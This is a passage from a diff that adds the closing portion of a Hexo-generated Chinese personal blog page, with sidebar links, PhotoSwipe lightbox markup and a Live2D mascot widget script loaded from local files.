+              <a href="http://www.cnblogs.com/tengj/p/5353897.html" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>深入hexo</a>
+            </li>
+          
+            <li class="search-li">
+              <a href="https://www.dnspod.cn/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>DNSPod</a>
+            </li>
+          
+            <li class="search-li">
+              <a href="http://ibruce.info/2013/11/26/markdown/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>markdown</a>
+            </li>
+          
+        </ul>
+  		
+    	</section>
+    
+
+    
+    	<section class="tools-section tools-section-me" q-show="aboutme">
+  	  	
+  	  		<div class="aboutme-wrap" id="js-aboutme">每天进步一点点</div>
+  	  	
+    	</section>
+    
+  </div>
+  
+</div>
+    <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":100,"height":200},"mobile":{"show":true,"scale":0.5}});</script></body>
+</html>
